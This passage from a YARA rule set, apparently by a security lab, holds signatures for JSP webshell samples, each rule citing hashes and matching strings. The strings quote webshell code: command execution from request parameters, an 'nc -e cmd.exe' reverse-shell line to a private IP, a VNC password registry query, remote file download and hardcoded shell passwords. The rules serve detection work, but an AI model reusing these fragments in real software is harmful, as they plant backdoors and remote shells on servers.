        $s18 = "post('<%=shellPath%>',{'m':'FileManage','do':'packFiles','path':path,'files':pfs,'zipName':zipName});" fullword ascii
        $s19 = "<form action=\"<%=shellPath %>\" method=\"post\" enctype=\"application/x-www-form-urlencoded\">" fullword ascii
        $s20 = "<a href=\"javascript:post('<%=shellPath%>',{m:'FileManage',do:'delete',path:'<%=currentPath%>'})\">" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule bbff3db22a3ef1a273d02fc0a5031c77d5f6a20e
{
    meta:
        description = "jsp - file bbff3db22a3ef1a273d02fc0a5031c77d5f6a20e.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5deda28b47b16d083c40e0fecdf617de7e645a7b06a053a572c6e2702dc8577b"
    strings:
        $x1 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
        $x2 = "<option value=\\\"nc -e cmd.exe 192.168.230.1 4444\\\">nc</option>\"" fullword ascii
        $x3 = ": \"c:\\\\windows\\\\system32\\\\cmd.exe\")" fullword ascii
        $x4 = "+ \"\\\" method=\\\"post\\\" onsubmit=\\\"this.submit();$('cmd').value='';return false;\\\" target=\\\"asyn\\\">\"" fullword ascii
        $x5 = "<a href=\\\"javascript:doPost({o:'vs'});\\\">Execute Command</a> | \"" fullword ascii
        $s6 = "((Invoker) ins.get(\"vLogin\")).invoke(request, response," fullword ascii
        $s7 = "ins.put(\"executesql\", new ExecuteSQLInvoker());" fullword ascii
        $s8 = "((Invoker) ins.get(\"login\")).invoke(request, response," fullword ascii
        $s9 = "+ (JSession.getAttribute(CURRENT_DIR).toString() + \"/exportdata.txt\")" fullword ascii
        $s10 = "+ \"')\\\">View</a> | <a href=\\\"javascript:doPost({o:'executesql',type:'struct',table:'\"" fullword ascii
        $s11 = "<option value='reg query \\\"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\RealVNC\\\\WinVNC4\\\" /v \\\"password\\\"'>vnc hash</option>\"" fullword ascii
        $s12 = "+ \"\\\" method=\\\"post\\\" target=\\\"echo\\\" onsubmit=\\\"$('cmd').focus()\\\">\"" fullword ascii
        $s13 = "Object obj = ((DBOperator) dbo).execute(sql);" fullword ascii
        $s14 = "ins.put(\"vLogin\", new VLoginInvoker());" fullword ascii
        $s15 = "<a href=\\\"javascript:doPost({o:'vd'});\\\">Download Remote File</a> | \"" fullword ascii
        $s16 = "var savefilename = prompt('Input Target File Name(Only Support ZIP)','pack.zip');\"" fullword ascii
        $s17 = "+ \" <option value='oracle.jdbc.driver.OracleDriver`jdbc:oracle:thin:@dbhost:1521:ORA1'>Oracle</option>\"" fullword ascii
        $s18 = "+ \"<h2>Execute Shell &raquo;</h2>\"" fullword ascii
        $s19 = "ins.put(\"login\", new LoginInvoker());" fullword ascii
        $s20 = "(new StreamConnector(process.getErrorStream(), socket" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule af1bfebf_d12f_47b3_b3ef_37246e667eda
{
    meta:
        description = "jsp - file af1bfebf-d12f-47b3-b3ef-37246e667eda.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0bc6b964aa651f363cebb2a9a0c74a595085fea8d897e4a51471f00bbd09c75a"
    strings:
        $s1 = "request.getParameter(\"t\").getBytes()); " fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule b3e5dd93abcc725407c00ad0e68f8e789bffbe4d
{
    meta:
        description = "jsp - file b3e5dd93abcc725407c00ad0e68f8e789bffbe4d.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c92947a659de7a5c208633b63daea905f304db47f7c9f7c5fa6ece39e926a8c4"
    strings:
        $x1 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));" fullword ascii
        $x2 = "request.setAttribute(\"error\", \"Execution of native commands is not allowed!\");" fullword ascii
        $x3 = "* Command of the shell interpreter and the parameter to run a programm" fullword ascii
        $x4 = "*  @param command the command to start the process" fullword ascii
        $s5 = ".processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
        $s6 = "<b><%=convertFileSize(size)%> in <%=fileCount%> files in <%=f.getName()%>. Compression ratio: <%=(f.length() * 100) / size%>%" fullword ascii
        $s7 = "static String startProcess(String command, String dir) throws IOException {" fullword ascii
        $s8 = "request.setAttribute(\"error\", \"Reading of \" + f.getName() + \" aborted. Error: \"" fullword ascii
        $s9 = "request.setAttribute(\"error\", \"You are not allowed to access \" + ht.get(\"dir\"));" fullword ascii
        $s10 = "* Max time in ms a process is allowed to run, before it will be terminated" fullword ascii
        $s11 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"\" + f.getName()" fullword ascii
        $s12 = "if (System.currentTimeMillis() - start > MAX_PROCESS_RUNNING_TIME) {" fullword ascii
        $s13 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"rename_me.zip\\\"\");" fullword ascii
        $s14 = "request.setAttribute(\"error\", \"You are not allowed to access \" + request.getAttribute(\"dir\"));" fullword ascii
        $s15 = "private static final long MAX_PROCESS_RUNNING_TIME = 30 * 1000; //30 seconds" fullword ascii
        $s16 = "request.setAttribute(\"error\", \"Directory \" + f.getAbsolutePath() + \" does not exist.\");" fullword ascii
        $s17 = "\"Content-Disposition\", \"inline;filename=\\\"temp.txt\\\"\");" fullword ascii
        $s18 = "request.setAttribute(\"error\", \"You are not allowed to access \" + new_f.getAbsolutePath());" fullword ascii
        $s19 = "request.setAttribute(\"error\", \"You are not allowed to access \" + f.getAbsoluteFile());" fullword ascii
        $s20 = "request.setAttribute(\"error\", \"You are not allowed to access \" + ef.getAbsolutePath());" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_689d37bb3f27d2ccea596906248c477f3c880f89
{
    meta:
        description = "jsp - file 689d37bb3f27d2ccea596906248c477f3c880f89.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "48f3946cc7f803765ab49085af9f021ed4aa3b80a6b1644ad913f2b7fced1ec8"
    strings:
        $x1 = "</font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>\"};" fullword ascii
        $s2 = "<a href=\"http://bbs.syue.com/\" target=\"_blank\">http://bbs.syue.com/</a></b>" fullword ascii
        $s3 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
        $s4 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('copy','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
        $s5 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'," ascii
        $s6 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('del','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','" ascii
        $s7 = "sbFile.append(\"\"+list[i].getName()); " fullword ascii
        $s8 = "sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsolutePat" ascii
        $s9 = "response.setContentType(\"APPLICATION/OCTET-STREAM\"); " fullword ascii
        $s10 = "<title>JSP Shell " fullword ascii
        $s11 = "sbCmd.append(line+\"\\r\\n\");  " fullword ascii
        $s12 = "sbEdit.append(htmlEncode(line)+\"\\r\\n\");  " fullword ascii
        $s13 = "private final static int languageNo=1; //" fullword ascii
        $s14 = "))+\"','','\"+strCmd+\"','1','');\\\">\");" fullword ascii
        $s15 = "<li><a href=\"http://www.smallrain.net\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lan" ascii
        $s16 = "<li><a href=\"http://www.smallrain.net\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lan" ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 90KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_03231be47ca1ca2c31e54d037df6fde6041d9a27
{
    meta:
        description = "jsp - file 03231be47ca1ca2c31e54d037df6fde6041d9a27.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "71dc3008254f4bac53d5c888c0883250d5a81404ff2c944835d19f80b9b83b74"
    strings:
        $s1 = "out.println(\"<div align='center'><form action='?act=login' method='post'>\");" fullword ascii
        $s2 = "out.println(\"<input type='submit' name='update' class='unnamed1' value='Login' />\");" fullword ascii
        $s3 = "out.println(\"<a href='javascript:history.go(-1)'><font color='red'>go back</font></a></div><br>\");" fullword ascii
        $s4 = "if(request.getSession().getAttribute(\"hehe\").toString().equals(\"hehe\"))" fullword ascii
        $s5 = "out.println(\"<textarea name='content' rows=15 cols=50></textarea><br>\");" fullword ascii
        $s6 = "out.println(\"<input type='password' name='pass'/>\");" fullword ascii
        $s7 = "String content=request.getParameter(\"content\");" fullword ascii
        $s8 = "<%!private String password=\"hehe\";//??????%>" fullword ascii
        $s9 = "<%@page contentType=\"text/html; charset=GBK\" import=\"java.io.*;\"%>" fullword ascii
        $s10 = "if(request.getSession().getAttribute(\"hehe\")!=null)" fullword ascii
        $s11 = "out.println(\"<form action=\"+url+\" method=post>\");" fullword ascii
        $s12 = "if (path!=null && !path.equals(\"\") && content!=null && !content.equals(\"\"))" fullword ascii
        $s13 = "}if(act.equals(\"login\"))" fullword ascii
        $s14 = "String pass=request.getParameter(\"pass\");" fullword ascii
        $s15 = "out.println(\"<font size=3><br></font><input type=text size=54 name='path'><br>\");" fullword ascii
        $s16 = "String url2=request.getRealPath(request.getServletPath());" fullword ascii
        $s17 = "session.setAttribute(\"hehe\",\"hehe\");" fullword ascii
        $s18 = "if(pass.equals(password))" fullword ascii
        $s19 = "writer.println(content);" fullword ascii
        $s20 = "String path=request.getParameter(\"path\");" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 6KB and ( 8 of them ) ) or ( all of them )
}

rule sig_4d58bcd197f2b63c8b93239da1da149d10f5cc12
{
    meta:
        description = "jsp - file 4d58bcd197f2b63c8b93239da1da149d10f5cc12.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "23c6ec0fa69a46fadc013bb6a8aadbd5fe98e1146eb9da448dc03ece5fc564a0"
    strings:
        $x1 = "Process p = Runtime.getRuntime().exec(strCommand, null," fullword ascii
        $x2 = "<a href=\"http://www.kukafei520.net/blog\" target=\"_blank\">http://www.kukkafei520.net/blog</a>" fullword ascii
        $s3 = "+ \"<form name=login method=post>username:<input name=LName type=text size=15><br>\"" fullword ascii
        $s4 = "+ \"password:<input name=LPass type=password size=15><br><input type=submit value=Login></form></center>\");" fullword ascii
        $s5 = "Hashtable ht = parser.processData(request.getInputStream()," fullword ascii
        $s6 = "pw.println(\"print \\\"voilet shell\\nblog:www.kukafei520.net.\\\\n\\\";\");" fullword ascii
        $s7 = "+ \"<form name=login method=post>" fullword ascii
        $s8 = "<div id=\"menu4\" class=\"tabcontent\"><!-- linux nc shell -->" fullword ascii
        $s9 = "<a href=\"#\" onClick=\"return expandcontent('menu2', this)\"> <%=strCommand[languageNo]%>" fullword ascii
        $s10 = "public Hashtable processData(ServletInputStream is, String boundary," fullword ascii
        $s11 = "\" + props.getProperty(\"java.io.tmpdir\")" fullword ascii
        $s12 = "\" + props.getProperty(\"user.dir\") + \"<br>\");" fullword ascii
        $s13 = "&& request.getParameter(\"LPass\").equals(password)) {" fullword ascii
        $s14 = "//System.out.println(strCommand);" fullword ascii
        $s15 = "+ props.getProperty(\"os.version\") + \"</h3>\");" fullword ascii
        $s16 = "\" + props.getProperty(\"user.home\") + \"<br>\");" fullword ascii
        $s17 = "\" + props.getProperty(\"user.name\") + \"<br>\");" fullword ascii
        $s18 = "private final String lineSeparator = System.getProperty(" fullword ascii
        $s19 = "value=\"<%=strExecute[languageNo]%>\">" fullword ascii
        $s20 = "+ list[i].getName() + \"','\" + strCmd + \"','\"" fullword ascii
    condition:
        ( uint16(0) == 0x3c0a and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_53b38b2940917f3fb327d71f8aef2ef1d8ce4387
{
    meta:
        description = "jsp - file 53b38b2940917f3fb327d71f8aef2ef1d8ce4387.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "09313b0c7b353d392366b5790476ba61a2b7edba8658c47870845387bf2505db"
    strings:
        $s1 = "System.setProperty(\"sun.net.client.defaultConnectTimeout\", String" fullword ascii
        $s2 = "System.setProperty(\"sun.net.client.defaultReadTimeout\", String" fullword ascii
        $s3 = "private static final String PW = \"admin\"; //password" fullword ascii
        $s4 = "responseContent = tempStr.toString();" fullword ascii
        $s5 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");" fullword ascii
        $s6 = "String tempLine = rd.readLine();" fullword ascii
        $s7 = "for (int i = SysInfo.length() - 1; i >= 0; i--) {" fullword ascii
        $s8 = "tempLine = rd.readLine();" fullword ascii
        $s9 = "tempStr.append(tempLine);" fullword ascii
        $s10 = "StringBuffer tempStr = new StringBuffer();" fullword ascii
        $s11 = "url_con = (HttpURLConnection) url.openConnection();" fullword ascii
        $s12 = "String c=\"\\n\\r\"; long d=127,  f=11, j=12, h=14,  m=31, r=83, k=1, n=8,  s=114, u=-5, v=5,a=0;" fullword ascii
        $s13 = "BufferedReader rd = new BufferedReader(new InputStreamReader(in," fullword ascii
        $s14 = "InputStream in = url_con.getInputStream();" fullword ascii
        $s15 = "String crlf=System.getProperty(\"line.separator\");" fullword ascii
        $s16 = "while (tempLine != null)" fullword ascii
        $s17 = "HttpURLConnection url_con = null;" fullword ascii
        $s18 = "private static int readTimeOut = 10000;" fullword ascii
        $s19 = "url_con.getOutputStream().close();" fullword ascii
        $s20 = "url_con.getOutputStream().flush();" fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_3870b31f26975a7cb424eab6521fc9bffc2af580
{
    meta:
        description = "jsp - file 3870b31f26975a7cb424eab6521fc9bffc2af580.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8c363b86ed9622b529f7b7e3bd10e05c30738dee595038400cdab9cd9033bad6"
    strings:
        $x1 = "System.out.println(\"getHostPort:\"+task);" fullword ascii
        $s2 = "System.out.println(\"getHtmlContext:\" + e.getMessage());" fullword ascii
        $s3 = "System.out.println(\"getCss:\" + e.getMessage());" fullword ascii
        $s4 = "System.out.println(\"getHtmlContext2:\" + e.getMessage());" fullword ascii
        $s5 = "String scantarget = useIp + i + \":\" + port[j];" fullword ascii
        $s6 = "System.out.println(\"end:\" + end);" fullword ascii
        $s7 = "System.out.println(\"start:\" + start);" fullword ascii
        $s8 = "String reaplce = \"href=\\\"http://127.0.0.1:8080/Jwebinfo/out.jsp?url=\";" fullword ascii
        $s9 = "String getHtmlContext(HttpURLConnection conn, String decode,boolean isError) {" fullword ascii
        $s10 = "String s = application.getRealPath(\"/\") + \"/port.txt\";" fullword ascii
        $s11 = "FileUtils.writeStringToFile(new File(cpath+\"/port.txt\"), s,\"UTF-8\",true);" fullword ascii
        $s12 = "<textarea name=\"post\" cols=40 rows=4>username=admin&password=admin</textarea>" fullword ascii
        $s13 = "//System.out.println(scantarget);" fullword ascii
        $s14 = "+ getHtmlContext(getHTTPConn(cssuuu), decode,false)" fullword ascii
        $s15 = "conn.addRequestProperty(\"User-Agent\"," fullword ascii
        $s16 = "java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url" fullword ascii
        $s17 = "<textarea name=\"post\" cols=40 rows=4>SESSION:d89de9c2b4e2395ee786f1185df21f2c51438059222</textarea>" fullword ascii
        $s18 = "Referer:<input name=\"referer\" value=\"http://www.baidu.com\"" fullword ascii
        $s19 = "System.out.print(e.getLocalizedMessage());" fullword ascii
        $s20 = "System.out.print(e.getMessage());" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 50KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_3593c50508dba517f8eae536688490e975f34fd7
{
    meta:
        description = "jsp - file 3593c50508dba517f8eae536688490e975f34fd7.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "148f88c0b115cf2e7d5a362863feef97b5c513c1f0925780009489ce5245e1f9"
    strings:
        $s1 = "new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),\"exeRclientO\",olp).start();//??????" fullword ascii
        $s2 = "private static final String PW = \"lucifer\"; //password" fullword ascii
        $s3 = ";\\\" /> <input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Scan\\\" id=\\\"submit\\\" class=\\\"bt\\\" />\"+" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule sig_9230e8c1c6dad3db204afacd3b36176d2da31165
{
    meta:
        description = "jsp - file 9230e8c1c6dad3db204afacd3b36176d2da31165.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8e9aa3a15c300cb6b43412d7369d7a0713041e548d935f98b783d747ba17267c"
    strings:
        $s1 = "long lastModified = !f.exists()?new SimpleDateFormat(\"yyyy-mm-dd HH:mm:ss\").parse(\"2012-03-14 12:43:11\").getTime():f.las" fullword ascii
        $s2 = "String dir = System.getProperty(\"user.dir\").replaceAll(\"\\\\\\\\\", \"/\")+\"/\";" fullword ascii
        $s3 = "File path  = new File(request.getSession().getServletContext().getRealPath(\"/\")+File.separator+\"META-INF\"+File.separator" fullword ascii
        $s4 = "File path  = new File(request.getSession().getServletContext().getRealPath(\"/\")+File.separator+\"META-INF\"+File.separator);" fullword ascii
        $s5 = "/* File f = new File(getServerPath()+File.separator+\"conf\"+File.separator+\"resin.xml\");" fullword ascii
        $s6 = "String key = \"<servlet-mapping url-pattern=\\\"*.jsp\\\" servlet-name=\\\"resin-jsp\\\"/>\";" fullword ascii
        $s7 = "File webXmlPath = new File(getServerPath()+File.separator+\"conf\"+File.separator+\"app-default.xml\");" fullword ascii
        $s8 = "File c = new File(getServerPath()+File.separator+\"conf\"+File.separator+\"cluster-default.xml\");" fullword ascii
        $s9 = "File webXmlPath = new File(getServerPath()+File.separator+\"conf\"+File.separator+\"web.xml\");" fullword ascii
        $s10 = "out.println(\"[/ok]<br/>\"+\"[path=\"+cd+File.separator+\"logo.png]\");" fullword ascii
        $s11 = "File path  = new File(request.getSession().getServletContext().getRealPath(\"/\"));" fullword ascii
        $s12 = "File f = new File((cd.length()>0?cd:path.toString())+File.separator+\"logo.png\");" fullword ascii
        $s13 = "writeStringToFile(c, content.replace(\"classpath:META-INF/caucho/app-default.xml\",\"${resin.home}/conf/app-default" fullword ascii
        $s14 = "out.println(\"[error:\"+x.toString()+\"]\");" fullword ascii
        $s15 = "out.println(\"[error:\"+e.toString()+\"]\");" fullword ascii
        $s16 = "if(null!=System.getProperty(s)&&new File(System.getProperty(s)).exists()){" fullword ascii
        $s17 = "String serverName = request.getSession().getServletContext().getServerInfo();" fullword ascii
        $s18 = "String reg = \"<servlet-mapping url-pattern=\\\"*.png\\\" servlet-name=\\\"resin-jsp\\\"/>\";" fullword ascii
        $s19 = "return System.getProperty(s).replaceAll(\"\\\\\\\\\", \"/\")+\"/\";" fullword ascii
        $s20 = "void writeStringToFile(File f,String content,String encode,boolean append) throws Exception{" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 20KB and ( 8 of them ) ) or ( all of them )
}

rule ee9408eb923f2d16f606a5aaac7e16b009797a07
{
    meta:
        description = "jsp - file ee9408eb923f2d16f606a5aaac7e16b009797a07.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5190880f0c90d3f792c13335e73af1feeb190fb058f324e841c7f6e1326e94b9"
    strings:
        $s1 = "java.io.InputStream in = Runtime.getRuntime().exec (request.getParameter(\"c\")).getInputStream();" fullword ascii
        $s2 = "if(\"maskshell\".equals(request.getParameter(\"pwd\"))){" fullword ascii
    condition:
        ( uint16(0) == 0x6854 and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule _home_chenzhongxiang_test_webshell_sample_jsp_2
{
    meta:
        description = "jsp - file 2.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "958daa41eb8ac61e8d3093cd60307a86ed8a92ca239f04c9dd8194674be1d4c4"
    strings:
        $x1 = "<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%!String Pwd=\"1\";String cs=\"UTF-8\";String EC(St" ascii
        $s2 = "Exception{Connection c=GC(s);Statement m=c.createStatement(1005,1008);BufferedWriter bw=null;try{ResultSet r=m.executeQuery(q.i" fullword ascii
        $s3 = "bstring(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);}els" ascii
        $s4 = "] x=s.trim().split(\"\\r\\n\");Connection c=GC(s);Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(\"select *" ascii
        $s5 = "tion e){sb.append(\"ERROR\"+\":// \"+e.toString());}sb.append(\"|\"+\"<-\");out.print(sb.toString());%>" fullword ascii
        $s6 = "util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());}void LL(String s,String d)throws Exception{URL u=new URL(s);int n=0;Fi" ascii
        $s7 = "i <=n; i++){sb.append(d.getColumnName(i)+\"\\t|\\t\");}sb.append(\"\\r\\n\");if(q.indexOf(\"--f:\")!=-1){File file=new File(p);i" ascii
        $s8 = "leOutputStream os=new FileOutputStream(d);HttpURLConnection h=(HttpURLConnection) u.openConnection();InputStream is=h.getInputSt" ascii
        $s9 = "ndexOf(\"--f:\")!=-1?q.substring(0,q.indexOf(\"--f:\")):q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(int " ascii
        $s10 = "-f:\")!=-1){bw.write(r.getObject(i)+\"\"+\"\\t\");bw.flush();}else{sb.append(r.getObject(i)+\"\"+\"\\t|\\t\");}}if(bw!=null){bw." ascii
        $s11 = "=request.getParameter(\"z0\")!=null?request.getParameter(\"z0\")+\"\":cs;response.setContentType(\"text/html\");response.setChar" ascii
        $s12 = "append(\"Execute Successfully!\\t|\\t\\r\\n\");}catch(Exception ee){sb.append(ee.toString()+\"\\t|\\t\\r\\n\");}}m.close();c.clo" ascii
        $s13 = "b.append(\"\\r\\n\");}r.close();if(bw!=null){bw.close();}}catch(Exception e){sb.append(\"Result\\t|\\t\\r\\n\");try{m.executeUpd" ascii
        $s14 = ")throws Exception{return new String(s.getBytes(\"ISO-8859-1\"),cs);}Connection GC(String s)throws Exception{String[] x=s.trim()." ascii
        $s15 = "=0; k < x.length; k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}void FF(String s,HttpServletResponse r)throws Except" ascii
        $s16 = "ream(new FileInputStream(s));os.write((\"->\"+\"|\").getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write((" ascii
        $s17 = "z1\")+\"\");String z2=EC(request.getParameter(\"z2\")+\"\");sb.append(\"->\"+\"|\");String s=request.getSession().getServletCont" ascii
        $s18 = "sQ,sF=\"\";java.util.Date dt;SimpleDateFormat fm=new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");for(int i=0; i<l.length; i++){dt=" ascii
        $s19 = "lit(\"\\r\\n\");Class.forName(x[0].trim());if(x[1].indexOf(\"jdbc:oracle\")!=-1){return DriverManager.getConnection(x[1].trim()+" ascii
        $s20 = "4],x[2].equalsIgnoreCase(\"[/null]\")?\"\":x[2],x[3].equalsIgnoreCase(\"[/null]\")?\"\":x[3]);}else{Connection c=DriverManager.g" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 20KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_93e42d381b31fd1d57de2e541cf68b7c75bff94e
{
    meta:
        description = "jsp - file 93e42d381b31fd1d57de2e541cf68b7c75bff94e.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "50f7ee552bcb9706aedfdb3219dc340c9a6b3c451d0898b9d4c2ab1ffc14efb1"
    strings:
        $x1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009 Private </a></s" ascii
        $s2 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009 Private </a></s" ascii
        $s3 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2009 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
        $s4 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2009 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
        $s5 = "private static final String PW = \"618618\"; //password" fullword ascii
        $s6 = "t.getHeader(\"host\")+\" (<span id='ip'>\"+InetAddress.getLocalHost().getHostAddress()+\"</span>) | <a href=\\\"javascript:if (!" ascii
        $s7 = "\"    <hr/>Export \\\"<span style='color:red;font-weight:bold'>\"+(Util.isEmpty(sql) ? table : sql.replaceAll(\"\\\"\",\"&quot;" ascii
        $s8 = "clipboardData){alert('only support IE!');}else{void(window.clipboardData.setData('Text', document.getElementById('ip').innerText" ascii
        $s9 = "byte[] b = colName.getBytes();" fullword ascii
        $s10 = "byte[] b = v.getBytes();" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule sig_7628589fcf7bf32067e67f5637445defad71302d
{
    meta:
        description = "jsp - file 7628589fcf7bf32067e67f5637445defad71302d.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4dc5f8054f0fff649e263b1eb7e82b30bd71fdea7d1d2b4c6299cb329029ac50"
    strings:
        $s1 = "System.setProperty(\"sun.net.client.defaultConnectTimeout\", String" fullword ascii
        $s2 = "System.setProperty(\"sun.net.client.defaultReadTimeout\", String" fullword ascii
        $s3 = "private static final String PW = \"xfg\"; //password" fullword ascii
        $s4 = "responseContent = tempStr.toString();" fullword ascii
        $s5 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");" fullword ascii
        $s6 = "String tempLine = rd.readLine();" fullword ascii
        $s7 = "for (int i = SysInfo.length() - 1; i >= 0; i--) {" fullword ascii
        $s8 = "tempLine = rd.readLine();" fullword ascii
        $s9 = "tempStr.append(tempLine);" fullword ascii
        $s10 = "StringBuffer tempStr = new StringBuffer();" fullword ascii
        $s11 = "url_con = (HttpURLConnection) url.openConnection();" fullword ascii
        $s12 = "String c=\"\\n\\r\"; long d=127,  f=11, j=12, h=14,  m=31, r=83, k=1, n=8,  s=114, u=-5, v=5,a=0;" fullword ascii
        $s13 = "BufferedReader rd = new BufferedReader(new InputStreamReader(in," fullword ascii
        $s14 = "InputStream in = url_con.getInputStream();" fullword ascii
        $s15 = "String crlf=System.getProperty(\"line.separator\");" fullword ascii
        $s16 = "while (tempLine != null)" fullword ascii
        $s17 = "HttpURLConnection url_con = null;" fullword ascii
        $s18 = "private static int readTimeOut = 10000;" fullword ascii
        $s19 = "url_con.getOutputStream().close();" fullword ascii
        $s20 = "url_con.getOutputStream().flush();" fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_906beecbef0928fbe38e1d9d100e9b02ef8e73fe
{
    meta:
        description = "jsp - file 906beecbef0928fbe38e1d9d100e9b02ef8e73fe.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "fd1e2d20ce0d500e4875198576b0ebea5888296814a2c8a4a5f17834ee59fbf5"
    strings:
        $x1 = "<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%!String Pwd=\"023\";String cs=\"UTF-8\";String EC(" ascii
        $s2 = "substring(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);}e" ascii
        $s3 = "k=0; k < x.length; k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}void FF(String s,HttpServletResponse r)throws Exce" fullword ascii
        $s4 = "g[] x=s.trim().split(\"\\r\\n\");Connection c=GC(s);Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(\"select" ascii
        $s5 = "File(s);f.createNewFile();FileOutputStream os=new FileOutputStream(f);for(int i=0; i<d.length();i+=2){os.write((h.indexOf(d.cha" fullword ascii
        $s6 = "ws Exception{Connection c=GC(s);Statement m=c.createStatement(1005,1008);BufferedWriter bw=null;try{ResultSet r=m.executeQuery(q" ascii
        $s7 = "eption e){sb.append(\"ERROR\"+\":// \"+e.toString());}sb.append(\"|\"+\"<-\");out.print(sb.toString());%>" fullword ascii
